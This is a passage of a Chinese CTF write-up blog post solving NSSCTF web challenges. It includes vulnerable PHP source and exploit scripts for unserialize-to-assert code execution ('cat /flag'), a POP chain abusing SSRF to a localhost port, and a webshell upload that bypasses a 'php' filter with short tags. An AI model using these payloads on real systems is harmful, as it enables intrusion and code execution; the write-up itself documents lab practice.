+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;  </span><br><span class="line">       </span><br><span class="line">     <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">     </span>&#123;        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;lt;        <span class="variable">$a</span>(<span class="variable language_">$this</span>-&gt;lly);  </span><br><span class="line">     &#125;  </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">&#125;  </span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>]);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>序列化脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lyh</span></span>&#123;  </span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$url</span> = <span class="string">&#x27;NSSCTF.com&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lt</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lly</span>;    </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lyh</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;lt=<span class="string">&quot;assert&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span>-&gt;lly=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;  </span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xznbHs"><img src="https://s1.ax1x.com/2022/11/08/xznbHs.png" alt="xznbHs.png" loading="lazy"></a></p>
+<h2 id="js-sign"><a href="#js-sign" class="headerlink" title="js_sign"></a>js_sign</h2><p>查看源码<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuVC6"><img src="https://s1.ax1x.com/2022/11/08/xzuVC6.png" alt="xzuVC6.png" loading="lazy"></a><br>通过tapcode解码flag出来下面这串字符，不知道怎么提交了<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuA4x"><img src="https://s1.ax1x.com/2022/11/08/xzuA4x.png" alt="xzuA4x.png" loading="lazy"></a></p>
+<h2 id="Power"><a href="#Power" class="headerlink" title="Power!"></a>Power!</h2><p>看源码有提示<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuTG6"><img src="https://s1.ax1x.com/2022/11/08/xzuTG6.png" alt="xzuTG6.png" loading="lazy"></a><br>全部的代码就不放了吧挺长的慢慢分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image_path&#x27;</span>];    <span class="comment">//flag in /flag.php</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$path</span>)&amp;&amp;!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http:|gopher:|glob:|php:/i&quot;</span>,<span class="variable">$path</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;Seriously??&lt;/h2&gt;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;cheems.jpg&quot;</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$path</span> = <span class="string">&quot;vergil.jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;POWER!!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>)).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>直接用get方法传入<code>image_path=flag.php</code><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzu7RK"><img src="https://s1.ax1x.com/2022/11/08/xzu7RK.png" alt="xzu7RK.png" loading="lazy"></a><br>解码一下这里<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuHxO"><img src="https://s1.ax1x.com/2022/11/08/xzuHxO.png" alt="xzuHxO.png" loading="lazy"></a><br>flag在内网，SSRF，看一下哪里能利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123; <span class="comment">//flag</span></span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$path</span>;</span><br><span class="line">            <span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>); <span class="comment">//curl_exec() 执行cURL会话。</span></span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以进行SSRF，跟一下这个函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$this</span>-&gt;black_list.<span class="string">&quot;/i&quot;</span>,<span class="variable">$this</span>-&gt;path))&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="variable">$this</span>-&gt;path);  <span class="comment">//执行这里</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">curl</span>(<span class="variable">$this</span>-&gt;local.<span class="string">&quot;cheems.jpg&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$file</span>).<span class="string">&#x27;&quot;/&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p><code>loadfile()</code>可以进行跳转，再跟<code>loadfile()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadfile</span>();   <span class="comment">//这里进入loadfile，此方法在尝试调用类方法，而方法不存在时被调用</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p><code>__call</code>方法可以进行跳转，想办法进入这里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">goodman</span>(<span class="params"><span class="variable">$i</span>,<span class="variable">$j</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$i</span>-&gt;<span class="variable">$j</span> = <span class="variable language_">$this</span>-&gt;superhacker;</span><br><span class="line">            <span class="comment">//$a-&gt;local=&quot;http://127.0.0.1:65500/&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">goodman</span>(<span class="variable">$this</span>-&gt;a,<span class="variable">$this</span>-&gt;b);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">c</span>(); <span class="comment">//$this-&gt;a=new FileViewer();执行c方法但是 FileViewer类没有c方法进入call方法</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>利用goodman函数进行变量覆盖，让a为FileViewer类的对象<code>b=&quot;local&quot;</code>，然后让Backdoor类下<br><code>superhacker=&quot;http://127.0.0.1:65500/&quot;</code>就可以覆盖成功，a为FileViewer对象但这个类里面没有c方法，进入<code>__call</code>魔术方法， 这样pop链构造完成，但是这里怎么利用呢？<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuqMD"><img src="https://s1.ax1x.com/2022/11/08/xzuqMD.png" alt="xzuqMD.png" loading="lazy"></a><br>直接传给image_path是失败了的<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzu5I1"><img src="https://s1.ax1x.com/2022/11/08/xzu5I1.png" alt="xzu5I1.png" loading="lazy"></a><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuoPx"><img src="https://s1.ax1x.com/2022/11/08/xzuoPx.png" alt="xzuoPx.png" loading="lazy"></a></p>
+<p>这篇博客打开是空的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$path_info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path_info&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path_info</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$FV</span>-&gt;<span class="title function_ invoke__">loadfile</span>();</span><br></pre></td></tr></table></figure>
+<p>所以我们得从这里进入localfile，原来的那条链子可以进行变量覆盖，我的理解是这样的，wp中这里没有太多解释<br>exp：来源wp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileViewer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$black_list</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$local</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Backdoor</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$superhacker</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">FileViewer</span>();</span><br><span class="line"><span class="variable">$n</span> = <span class="keyword">new</span> <span class="title class_">Backdoor</span>();</span><br><span class="line"><span class="variable">$n</span>-&gt;a=<span class="variable">$m</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;b=<span class="string">&quot;local&quot;</span>;</span><br><span class="line"><span class="variable">$n</span>-&gt;superhacker=<span class="string">&quot;127.0.0.1:65500/&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;black_list=<span class="string">&quot;黑名单什么的管不着我&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;local=<span class="variable">$n</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;path=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>感觉没太理解有点问题，先这样吧<br>path_info进入<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzu4aR"><img src="https://s1.ax1x.com/2022/11/08/xzu4aR.png" alt="xzu4aR.png" loading="lazy"></a><br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuWqJ"><img src="https://s1.ax1x.com/2022/11/08/xzuWqJ.png" alt="xzuWqJ.png" loading="lazy"></a><br>解码得到flag<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzuhZ9"><img src="https://s1.ax1x.com/2022/11/08/xzuhZ9.png" alt="xzuhZ9.png" loading="lazy"></a></p>
+<h2 id="file-master"><a href="#file-master" class="headerlink" title="file_master"></a>file_master</h2><p>进来有个查看文件，试一下index.php<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKHkn"><img src="https://s1.ax1x.com/2022/11/08/xzKHkn.png" alt="xzKHkn.png" loading="lazy"></a><br>查看源码<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKbYq"><img src="https://s1.ax1x.com/2022/11/08/xzKbYq.png" alt="xzKbYq.png" loading="lazy"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$whtie_list</span> = <span class="keyword">array</span>(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$filetype</span>,<span class="variable">$whtie_list</span>))&#123;</span><br><span class="line">            <span class="variable">$img_info</span> = @<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$img_info</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$save_path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>().<span class="string">&quot;/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;upload success!! upload/your_sessionid/your_filename&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;image hight and width must less than 20&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;invalid file head&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;invalid file type!image/jpeg only!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:jpg;base64,&#x27;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;welcome.jpg&quot;</span>)).<span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>传一张图片马显示太大了<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKqf0"><img src="https://s1.ax1x.com/2022/11/08/xzKqf0.png" alt="xzKqf0.png" loading="lazy"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$img_info</span>[<span class="number">0</span>]&lt;=<span class="number">20</span> &amp;&amp; <span class="variable">$img_info</span>[<span class="number">1</span>]&lt;=<span class="number">20</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>()))&#123;</span><br><span class="line">                        <span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;upload/&quot;</span>.<span class="title function_ invoke__">session_id</span>());</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+<p>直接使用define改，第一次遇到这中操作，题刷的太少了<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKowj"><img src="https://s1.ax1x.com/2022/11/08/xzKowj.png" alt="xzKowj.png" loading="lazy"></a><br>被拦了，而且有延时</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">                       <span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line">                       @<span class="title function_ invoke__">unlink</span>(<span class="variable">$save_path</span>);</span><br><span class="line">                       <span class="keyword">die</span>(<span class="string">&quot;hacker!!!&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>试一下短标签<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKImQ"><img src="https://s1.ax1x.com/2022/11/08/xzKImQ.png" alt="xzKImQ.png" loading="lazy"></a><br>上传成功，PHP试一下<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzK4Og"><img src="https://s1.ax1x.com/2022/11/08/xzK4Og.png" alt="xzK4Og.png" loading="lazy"></a><br>成功，路径直接提示了格式，连蚁剑<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKh6S"><img src="https://s1.ax1x.com/2022/11/08/xzKh6S.png" alt="xzKh6S.png" loading="lazy"></a><br>不知道为什么连不上，进入文件发现报错<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKfl8"><img src="https://s1.ax1x.com/2022/11/08/xzKfl8.png" alt="xzKfl8.png" loading="lazy"></a><br>多了一个<code>&gt;</code>删掉连接成功，文件打不开直接进终端<br><a target="_blank" rel="noopener" href="https://imgse.com/i/xzKTTs"><img src="https://s1.ax1x.com/2022/11/08/xzKTTs.png" alt="xzKTTs.png" loading="lazy"></a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇复现鸽了这么久终于弄完了，这篇博客图片上传的真不容易啊，obsidain对图片的处理真的麻烦，得找个插件解决一下这个问题，不然下次还得一个个重新截图保存上传，博客还不够完善，导航都还没弄，找个时间弄弄吧</p>
+
+</article>
+    
+    
+</div>
+<div class="row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-mb-40 trm-title-with-divider">
+            Other Articles
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation" data-scroll data-scroll-offset="40">
+        <a href="/undefined/3364.html" class="trm-cover-frame trm-anima-link">
+            <img src="/img/block.jpg" alt="cover">
+        </a>
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E4%B8%AA%E4%BA%BA/">
+                    个人
+                </a>
+            </div>
+            <h5>
+                <a href="/undefined/3364.html" class="trm-anima-link">
+                    成长
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>22/10/13</li>
+                <li>05:08</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+
+                    <div class="trm-divider trm-mb-40"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-scroll-animation" data-scroll data-scroll-offset="50">
+
+    
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v6.3.0
+            </span>
+            <span class="footer-separator"> | </span>
+            <span> 
+                Theme - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                vv1.1.8
+            </span>
+        </div>
+      
+
+    
+        <div class="trm-footer-item">
+            The blog has been lovely to run <span id="since" class="trm-accent-color"></span> day
+        </div>
+     
+
+     
+</footer>
+
+<script>
+    function show_date_time () {
+        BirthDay = new Date("2022/10/5");
+        today = new Date();
+        timeold = (today.getTime() - BirthDay.getTime());
+        msPerDay = 24 * 60 * 60 * 1000
+        day = Math.floor(timeold / msPerDay)
+        since.innerHTML = day
+    }
+    show_date_time()
+</script>
+ 
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+          </div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+
+  </div>
+  <!-- app wrapper end -->
+
+  <div id="trm-back-top" class="trm-back-top">
+    <i class="fas fa-arrow-up"></i>
+</div>
+  
+  <!-- Plugin -->
+
+
+
+
+    
